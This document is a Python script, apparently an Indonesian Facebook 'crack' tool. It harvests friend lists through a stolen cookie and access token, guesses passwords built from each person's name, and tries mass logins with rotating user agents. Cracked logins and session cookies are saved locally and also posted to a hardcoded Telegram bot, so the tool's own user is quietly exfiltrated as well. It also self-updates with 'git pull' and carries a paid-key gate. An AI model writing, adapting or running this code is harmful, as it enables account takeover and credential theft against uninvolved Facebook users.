#!/usr/bin/python3
# -*- coding: utf-8 -*-

#━━━━━━━━━━━[ IMPORT ]━━━━━━━━━━━#
import requests,bs4,json,os,sys,random,datetime,time,re,platform,uuid
import urllib3,rich,base64
from rich.console import Console
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as Xyraa
from rich import print as cetak
from rich.panel import Panel as nel
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

#━━━━━━━━━━━[  VARIABLE ]━━━━━━━━━━━#
uid,pwpluss,pwnya,ugen,id,id2,method,pwv=[],[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
rc=random.choice
rr=random.randint
ses = requests.Session()

#━━━━━━━━━━━[ PEWARNA DEF ]━━━━━━━━━━━#
A = '\x1b[1;97m' ;R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'

#━━━━━━━━━━━[ TAMBAHAN DEF ]━━━━━━━━━━━#
def clear():os.system('clear')
def back():main()
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#━━━━━━━━━━━[ USERAGENT PRIVACY ]━━━━━━━━━━━#
for xd in range(10000):
	a='Mozilla/5.0 (iPhone;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPU iPhone OS 18_0 like Mac OS X)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile/15E148 Safari/604.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' iPhone 13 Pro Max)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku) 

def sabunmandi():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    return f'Mozilla/5.0 (X{rr(11,16)}; Linux x86_64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(130,160)}.0.{rr(6723,8000)}.{rr(100,200)} YaBrowser/{rr(24,30)}.{rr(12,20)}.{rr(3,7)}.{rr(100,200)}.{rr(00,15)} SA/3 Safari/537.36'
#━━━━━━━━━━━[ LOGO DEF ]━━━━━━━━━━━#
logo=(f"""{A}  ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣶⠶⠶⣶⣤⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⠾⠛⠉⠀⢠⣾⣴⡾⠛⠻⣷⣄⠀⠀⠀⠀⠀
⠀⠀⢶⣶⣶⣿⣁⠀⠀⠀⠀⢸⣿⠏⢀⣤⣶⣌⠻⣦⡀⠀⠀⠀
⠀⠀⣴⡟⠁⢉⣙⣿⣦⡀⠀⢸⡏⣴⠟⢡⣶⣿⣧⡹⣷⡀⠀⠀
⠀⣼⠏⢀⣾⠟⠛⠛⠻⣿⡆⠀⠀⢿⣄⠀⠙⠉⠹⣷⡸⣷⠀⠀
⢠⣿⠀⢸⡿⢿⠇⠀⠀⣾⠇⠀⣀⣈⠻⢷⣤⣤⣤⡾⠃⢹⣇⠀
⢸⣿⠀⢸⣧⣀⣀⣠⣾⢋⣴⢿⣿⡛⠻⣶⣤⣉⠁⠀⠀⠀⣿⠀
⠈⣿⠀⠀⠙⠛⠛⠋⠁⣼⣯⣀⣿⠿⠶⠟⠉⠛⢷⣄⠀⠀⣿⡇
⠀⣿⠀⠀⠀⠀⠀⠀⠀⣿⡏⠉⠁⠀⠀⢀⣴⢶⣄  ⢻⡇  ⢸⡇
⠀⢻⣇⠀⠀⠀⠀⠀⢠⡿⢀⣀⢠⣾⠷⣾⣧⡶⠿⠟⠁⠀⣾⡇
⠀⠈⣿⣧⡀⠀⠀⣠⣿⣷⠟⢻⣿⣷⡾⠛⠉⠀⠀⠀⠀⢀⣿⠀
⠀⠀⢹⣿⢻⣦⡀⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⣼⠏⠀
⠀⠀⠀⠛⠀⠈⠻⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠟⠀\n  """)
        
#━━━━━━━━━━━[ LOGIN DEF ]━━━━━━━━━━━#
def login_cok():
	try:
		clear()
		Console(width=50, style="bold green").print(Panel("[italic white]Masukan Cookies Facebook, Jangan Menggunakan Akun [italic green]Pribadi [white],Jika Gagal Login Gunakan Akun Lama [italic red]Contoh Uid Cookies [white]: [italic green]100028372637278 ",subtitle="",subtitle_align="left"));cok = Console().input("[bold green]   > ")
		open('.cok.txt','w').write(cok)
		with requests.Session() as r:
			try:
				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
				response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
				if  '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1);open('.tok.txt','w').write(token)
				else:Console(width=50, style="bold green").print(Panel("[italic red]Cookies Invalid...[italic white]"));exit()
			except Exception as e:print(e);exit()
		Console(width=50, style="bold green").print(Panel("[italic white]Login Berhasil[italic white]"))
		time.sleep(2);exit()
	except Exception as e:os.system('rm -rf .cok.txt');os.system('rm -rf .tok.txt');print(e);exit()

		
           #━━━━━━━━━━━[ MENU DEF ]━━━━━━━━━━━#
def Start():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		os.system("rm -f .token.txt && .cookies.txt")
		time.sleep(5)
		login_cok()
	clear();print(logo)
	dump_massal()
	
              #━━━━━━━━━━━[ MASSAL DEF ]━━━━━━━━━━━#
def dump_massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		Console(width=50, style="bold green").print(Panel("[bold red]Cookies Anda Sudah Kedaluwarsa/Mati. Silahkan Login Ulang...[italic white]"))
		login_cok()
	try:
		xx = input(f"{A}- Input Uid : {G}")
	except ValueError:
		print(f"{A}- Input Yang Dimasukan Salah")
		exit()
	if str(xx) == '':
		print(f"{A}- Gagal Dump {R}UID {A}Kemungkinan Private")
		exit()
	ses = requests.Session()
	jumlah = xx.split(',')
	for xmx in jumlah:
		uid.append(xmx)
	for user in uid:
		try:
			url = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in url['friends']['data']:
				try:
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):pass
	try:
		setting()
	except requests.exceptions.ConnectionError:print(f"{A}Tidak Ada Koneksi Internet");exit()
        
          #━━━━━━━━━━━[ SETTING DEF ]━━━━━━━━━━━#
def setting():
	
	passwrd()

              #━━━━━━━━━━━[ PASSWORD DEF ]━━━━━━━━━━━#
def passwrd():
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	linex()
	global prog,des
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with Xyraa(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+ '123')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'123')
						pwv.append(frs+'321')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+ '123')
				if 'crack' in method:
					pool.submit(validate,idf,pwv)
				else:
					pool.submit(validate,idf,pwv)
		
                #━━━━━━━━━━━[ PRIVACY DEF ]━━━━━━━━━━━#
def validate(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des)
	pro = rc(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://web.prod.facebook.com/?_rdc=1&_rdr').text
			headers = {
'Host': 'web.prod.facebook.com',
'content-length': '275',
'cache-control': 'max-age=0',
'sec-ch-ua': 'Not-A.Brand;v=99, Chromium;v=124',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Linux',
'upgrade-insecure-requests': '1',
'origin': 'https://web.prod.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': 'https://web.prod.facebook.com/?_rdc=1&_rdr',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
}
			data = {
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
    'email': idf,
    'login_source': 'comet_headerless_login',
    'next': '',
    'pass': pw,
}
			po = ses.post('https://web.prod.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MDA3NDk5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next=',headers=headers,data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				coki= po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{G1}[{B}OK{G1}] {idf}{A}|{G1}{pw}{A}|{G1}{kuki}')
				requests.post(f"https://api.telegram.org/bot7858153099:AAGO1QR21zy2sqVW9K8hIlnPz7vxQ1LzqHg/sendMessage?chat_id=5175475380&text={idf}|{pw}|{kuki}")
				open('OK/'+'stor.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict():
				cp+=1
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				print(f'\r{Y}[{B}CP{Y}] {idf}{A}|{Y}{pw}')
				requests.post(f"https://api.telegram.org/bot7858153099:AAGO1QR21zy2sqVW9K8hIlnPz7vxQ1LzqHg/sendMessage?chat_id=5175475380&text={idf}|{pw}")
				open('CP/'+'stor.txt','a').write(idf+'|'+pw+'|'+'\n')
				break			
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def approval():
	clear()
	uuid = str(os.geteuid())
	id =(f"{str(rr(0,9))}|{str(rr(0,9))}|{str(rr(0,9))}|{str(rr(0,9))}|{str(rr(0,9))}|{str(rr(0,9))}|{str(rr(0,9))}|{str(rr(0,9))}|{str(rr(0,9))}")
	httpCaht = requests.get('https://github.com/kentang13336/making..py/blob/main/LICENSE.txt').text
	if id in httpCaht:
		print('SUCCESSFUL APPROVAL')
		msg = str(os.geteuid())
		time.sleep(0.5)
		Start()
		 
	print(' Your Key : SBN=[' + id + ']=XX')
	print(' This Is Paid Tool ')
	print('')
	input('Click Enter To Sent Key Admin WhatsApp ')
	tks = 'Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20' + id
	os.system('am start https://wa.me/6283841015077?text=' + tks)
	time.sleep(1)
	exit()
	 
	sys.exit()
#━━━━━━━━━━━[ SYSTEM CONTROL ]━━━━━━━━━━━#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	approval()